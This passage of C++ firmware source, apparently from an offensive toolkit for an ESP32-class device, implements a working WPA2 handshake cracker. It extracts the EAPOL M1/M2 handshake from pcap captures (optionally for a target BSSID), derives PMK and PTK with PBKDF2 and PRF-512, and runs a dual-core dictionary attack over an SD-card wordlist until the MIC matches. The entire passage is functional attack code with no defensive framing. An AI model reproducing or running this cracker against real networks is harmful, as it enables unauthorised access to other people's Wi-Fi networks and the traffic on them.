  static const char label[] = "Pairwise key expansion";
  uint8_t ctr = 0;
  size_t pos = 0;
  EvilHmacPre pre;
  evil_hmac_precompute(pmk, 32, pre);

  while (pos < 64) {
    EvilSha1Ctx ctx = pre.inner;
    evil_sha1_update(ctx, (const uint8_t*)label, sizeof(label));
    evil_sha1_update(ctx, data, 6+6+32+32);
    evil_sha1_update(ctx, &ctr, 1);
    uint8_t inner_hash[20];
    evil_sha1_final(ctx, inner_hash);

    EvilSha1Ctx octx = pre.outer;
    evil_sha1_update(octx, inner_hash, 20);
    uint8_t digest[20];
    evil_sha1_final(octx, digest);

    size_t c = (64-pos < 20) ? (64-pos) : 20;
    memcpy(ptk+pos, digest, c);
    pos += c; ctr++;
  }
}

bool evil_verify_mic(const evil_wpa2_hs_t &hs, const uint8_t ptk[64]) {
  uint8_t mic[20];
  EvilHmacPre pre;
  evil_hmac_precompute(ptk, 16, pre);
  evil_hmac_sha1_pre(pre, hs.eapol, hs.eapol_len, mic);
  return memcmp(mic, hs.mic, 16) == 0;
}

/* =================================================================
   Dual-core cracker infrastructure
   ================================================================= */

__attribute__((optimize("O3"), hot))
bool evil_try_password(const EvilCrackShared &S, const char *pw, uint8_t pw_len) {
  const evil_wpa2_hs_t &hs = *S.hs;
  EvilHmacPre pw_pre;
  evil_hmac_precompute((const uint8_t*)pw, pw_len, pw_pre);
  uint8_t pmk[32];
  evil_pbkdf2(pw_pre, (const uint8_t*)hs.ssid, hs.ssid_len, 4096, pmk);
  uint8_t ptk[64];
  evil_prf512(pmk, hs.prf_data, ptk);
  return evil_verify_mic(hs, ptk);
}

void evil_crack_worker(void *arg) {
  EvilCrackShared &S = *(EvilCrackShared*)arg;
  EvilPwEntry entry;

  while (true) {
    if (xQueueReceive(S.queue, &entry, portMAX_DELAY) != pdTRUE) break;
    if (entry.len == 0) break; // poison pill
    if (S.found || S.abort) {
      __atomic_fetch_add(&S.attempts, 1, __ATOMIC_RELAXED);
      continue;
    }
    if (evil_try_password(S, entry.pw, entry.len)) {
      S.found = true;
      memcpy(S.found_pw, entry.pw, entry.len + 1);
    }
    __atomic_fetch_add(&S.attempts, 1, __ATOMIC_RELAXED);
    if (CRACK_YIELD_MS > 0) vTaskDelay(pdMS_TO_TICKS(CRACK_YIELD_MS));
  }
  xSemaphoreGive(S.done_sem);
  vTaskDelete(NULL);
}

/* =================================================================
   Buffered wordlist reader (4KB SRAM)
   ================================================================= */
struct EvilWordlistReader {
  File    *file;
  uint8_t *buf;
  size_t   cap, len, pos;
  bool     eof;

  bool init(File *f) {
    file = f; cap = CRACK_WORDLIST_BUFSZ;
    buf = (uint8_t*)malloc(cap);
    len = pos = 0; eof = false;
    return buf != nullptr;
  }
  void deinit() { if (buf) { free(buf); buf = nullptr; } }

  void refill() {
    if (eof) return;
    size_t rem = len - pos;
    if (rem) memmove(buf, buf + pos, rem);
    len = rem; pos = 0;
    size_t rd = file->read(buf + len, cap - len);
    len += rd;
    if (rd == 0) eof = true;
  }

  bool nextLine(char *out, size_t max_len) {
    while (true) {
      for (size_t i = pos; i < len; i++) {
        if (buf[i] == '\n') {
          size_t ll = i - pos;
          if (ll > 0 && buf[pos + ll - 1] == '\r') ll--;
          size_t cp = (ll < max_len) ? ll : max_len;
          memcpy(out, buf + pos, cp);
          out[cp] = '\0';
          pos = i + 1;
          return true;
        }
      }
      if (eof) {
        size_t rem = len - pos;
        if (!rem) return false;
        if (buf[pos + rem - 1] == '\r') rem--;
        size_t cp = (rem < max_len) ? rem : max_len;
        memcpy(out, buf + pos, cp);
        out[cp] = '\0';
        pos = len;
        return cp > 0;
      }
      refill();
    }
  }
  bool available() const { return !eof || pos < len; }
};

/* =================================================================
   Helpers (kept for extract + menu)
   ================================================================= */
void macToStr(const uint8_t m[6], char out[18]) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}

bool macEq(const uint8_t a[6], const uint8_t b[6]) {
  return memcmp(a, b, 6) == 0;
}

void hsReset(evil_wpa2_hs_t &hs) {
  memset(&hs, 0, sizeof(hs));
  hs.valid = false;
  hs.ssid[0] = '\0';
}

bool pcapRead32(File &f, uint32_t &v) {
  uint8_t b[4];
  if (f.read(b,4)!=4) return false;
  v = (uint32_t)b[0] | ((uint32_t)b[1]<<8) | ((uint32_t)b[2]<<16) | ((uint32_t)b[3]<<24);
  return true;
}

void tryParseBeaconSSID(const uint8_t *frm, uint32_t len, evil_wpa2_hs_t &hs) {
  if (len < 36) return;
  uint16_t fc = (uint16_t)frm[0] | ((uint16_t)frm[1] << 8);
  uint8_t type = (fc & 0x000C) >> 2;
  uint8_t sub  = (fc & 0x00F0) >> 4;
  if (type != 0x00 || sub != 0x08) return;
  const uint8_t *bssid = frm + 16;
  uint32_t off = 24;
  if (len < off + 12) return;
  off += 12;
  while (off + 2 <= len) {
    uint8_t id = frm[off], il = frm[off+1];
    off += 2;
    if (off + il > len) break;
    if (id == 0x00) {
      if (il == 0 || il > 32) return;
      if (hs.ssid[0] == '\0') {
        memcpy(hs.ssid, frm + off, il);
        hs.ssid[il] = '\0';
        memcpy(hs.ap, bssid, 6);
      }
      return;
    }
    off += il;
  }
}

int findSnapEapol(const uint8_t *frm, uint32_t len) {
  if (len < 8) return -1;
  for (uint32_t i = 0; i + 8 <= len; i++) {
    if (frm[i]==0xAA && frm[i+1]==0xAA && frm[i+2]==0x03 &&
        frm[i+3]==0x00 && frm[i+4]==0x00 && frm[i+5]==0x00 &&
        frm[i+6]==0x88 && frm[i+7]==0x8E) return (int)i;
  }
  return -1;
}

uint64_t readBE64(const uint8_t *p) {
  uint64_t v = 0;
  for (int i = 0; i < 8; i++) v = (v << 8) | p[i];
  return v;
}

/* ---- Extract handshake (M1+M2) from an Evil PCAP ---- */
bool evil_wpa2_extract_from_pcap(const String &path, evil_wpa2_hs_t &hs) {
  memset(&hs, 0, sizeof(hs));
  File f = SD.open(path, FILE_READ);
  if (!f) return false;

  uint8_t gh[24];
  if (f.read(gh, 24) != 24) { f.close(); return false; }
  if (!(gh[0]==0xD4 && gh[1]==0xC3 && gh[2]==0xB2 && gh[3]==0xA1)) { f.close(); return false; }

  bool gotM1=false, gotM2=false;
  uint64_t replay_m1 = 0;
  uint8_t rec[EVIL_WPA2_MAX_PCAPREC];

  while (f.available() > 16) {
    uint32_t ts, tu, incl, orig;
    if (!pcapRead32(f, ts) || !pcapRead32(f, tu) ||
        !pcapRead32(f, incl) || !pcapRead32(f, orig)) break;
    if (!incl || incl > sizeof(rec)) { f.seek(f.position() + incl); continue; }
    if (f.read(rec, incl) != (int)incl) break;

    tryParseBeaconSSID(rec, incl, hs);

    int snap = findSnapEapol(rec, incl);
    if (snap < 0) continue;

    const uint8_t *addr1 = rec + 4;
    const uint8_t *addr2 = rec + 10;
    const uint8_t *eapol = rec + snap + 8;

    if (eapol[1] != 0x03) continue;
    uint16_t eap_len = (eapol[2]<<8)|eapol[3];
    uint16_t total   = 4 + eap_len;
    if (snap + 8 + total > incl) continue;

    const uint8_t *key = eapol + 4;
    uint16_t ki = (key[1]<<8)|key[2];
    bool ack  = ki & KI_ACK;
    bool mic  = ki & KI_MIC;
    bool inst = ki & 0x0040;
    bool sec  = ki & 0x0200;
    uint8_t keyver = ki & 7;
    uint64_t replay = readBE64(key + 5);

    if (!gotM1 && ack && !mic) {
      memcpy(hs.anonce, key + 13, 32);
      memcpy(hs.ap, addr2, 6);
      memcpy(hs.sta, addr1, 6);
      replay_m1 = replay;
      gotM1 = true;
      continue;
    }
    if (!gotM2 && !ack && mic && !inst && !sec && (keyver >= 1 && keyver <= 3)) {
      if (!gotM1) continue;
      if (replay != replay_m1) continue;
      if (!macEq(addr2, hs.sta) || !macEq(addr1, hs.ap)) continue;
      memcpy(hs.snonce, key + 13, 32);
      memcpy(hs.mic, eapol + 81, 16);
      memcpy(hs.eapol, eapol, total);
      memset(hs.eapol + 81, 0, 16);
      hs.eapol_len = total;
      gotM2 = true;
      continue;
    }
  }
  f.close();
  if (!(gotM1 && gotM2 && hs.ssid[0])) return false;

  uint8_t *p = hs.prf_data;
  if (memcmp(hs.ap, hs.sta, 6) < 0) {
    memcpy(p, hs.ap, 6); p+=6; memcpy(p, hs.sta, 6); p+=6;
  } else {
    memcpy(p, hs.sta, 6); p+=6; memcpy(p, hs.ap, 6); p+=6;
  }
  if (memcmp(hs.anonce, hs.snonce, 32) < 0) {
    memcpy(p, hs.anonce, 32); p+=32; memcpy(p, hs.snonce, 32); p+=32;
  } else {
    memcpy(p, hs.snonce, 32); p+=32; memcpy(p, hs.anonce, 32); p+=32;
  }
  hs.ssid_len = strlen(hs.ssid);
  hs.valid = true;
  return true;
}

/* =================================================================
   Extract handshake for a specific BSSID (from parsePcapMultiHS entry)
   Re-reads the pcap and fills evil_wpa2_hs_t for the target AP.
   ================================================================= */
bool evil_wpa2_extract_by_bssid(const String &path, const uint8_t targetBssid[6],
                                 const char *ssid, evil_wpa2_hs_t &hs) {
  memset(&hs, 0, sizeof(hs));
  File f = SD.open(path, FILE_READ);
  if (!f) return false;

  uint8_t gh[24];
  if (f.read(gh, 24) != 24) { f.close(); return false; }
  if (!(gh[0]==0xD4 && gh[1]==0xC3 && gh[2]==0xB2 && gh[3]==0xA1)) { f.close(); return false; }

  bool gotM1 = false, gotM2 = false;
  uint64_t replay_m1 = 0;
  uint8_t rec[EVIL_WPA2_MAX_PCAPREC];

  while (f.available() > 16) {
    uint32_t ts, tu, incl, orig;
    if (!pcapRead32(f, ts) || !pcapRead32(f, tu) ||
        !pcapRead32(f, incl) || !pcapRead32(f, orig)) break;
    if (!incl || incl > sizeof(rec)) { f.seek(f.position() + incl); continue; }
    if (f.read(rec, incl) != (int)incl) break;

    /* Beacon: grab SSID if not provided */
    if (!ssid || ssid[0] == '\0') tryParseBeaconSSID(rec, incl, hs);

    int snap = findSnapEapol(rec, incl);
    if (snap < 0) continue;

    const uint8_t *addr1 = rec + 4;
    const uint8_t *addr2 = rec + 10;
    const uint8_t *eapol = rec + snap + 8;

    if (eapol[1] != 0x03) continue;
    uint16_t eap_len = (eapol[2]<<8)|eapol[3];
    uint16_t total   = 4 + eap_len;
    if (snap + 8 + total > incl) continue;

    const uint8_t *key = eapol + 4;
    uint16_t ki = (key[1]<<8)|key[2];
    bool ack  = ki & KI_ACK;
    bool mic  = ki & KI_MIC;
    bool inst = ki & 0x0040;
    bool sec  = ki & 0x0200;
    uint8_t keyver = ki & 7;
    uint64_t replay = readBE64(key + 5);

    /* M1: filter by target BSSID (addr2 = AP source) */
    if (!gotM1 && ack && !mic && memcmp(addr2, targetBssid, 6) == 0) {
      memcpy(hs.anonce, key + 13, 32);
      memcpy(hs.ap, addr2, 6);
      memcpy(hs.sta, addr1, 6);
      replay_m1 = replay;
      gotM1 = true;
      continue;
    }
    /* M2: filter by target BSSID (addr1 = AP dest) */
    if (!gotM2 && !ack && mic && !inst && !sec && (keyver >= 1 && keyver <= 3)
        && memcmp(addr1, targetBssid, 6) == 0) {
      if (!gotM1) continue;
      if (replay != replay_m1) continue;
      if (!macEq(addr2, hs.sta) || !macEq(addr1, hs.ap)) continue;
      memcpy(hs.snonce, key + 13, 32);
      memcpy(hs.mic, eapol + 81, 16);
      memcpy(hs.eapol, eapol, total);
      memset(hs.eapol + 81, 0, 16);
      hs.eapol_len = total;
      gotM2 = true;
      continue;
    }
  }
  f.close();

  /* Apply provided SSID if beacon didn't set it */
  if (ssid && ssid[0] && !hs.ssid[0]) {
    strncpy(hs.ssid, ssid, 32);
    hs.ssid[32] = '\0';
  }

  if (!(gotM1 && gotM2 && hs.ssid[0])) return false;

  /* Build PRF data */
  uint8_t *p = hs.prf_data;
  if (memcmp(hs.ap, hs.sta, 6) < 0) {
    memcpy(p, hs.ap, 6); p+=6; memcpy(p, hs.sta, 6); p+=6;
  } else {
    memcpy(p, hs.sta, 6); p+=6; memcpy(p, hs.ap, 6); p+=6;
  }
  if (memcmp(hs.anonce, hs.snonce, 32) < 0) {
    memcpy(p, hs.anonce, 32); p+=32; memcpy(p, hs.snonce, 32);
  } else {
    memcpy(p, hs.snonce, 32); p+=32; memcpy(p, hs.anonce, 32);
  }
  hs.ssid_len = strlen(hs.ssid);
  hs.valid = true;
  return true;
}

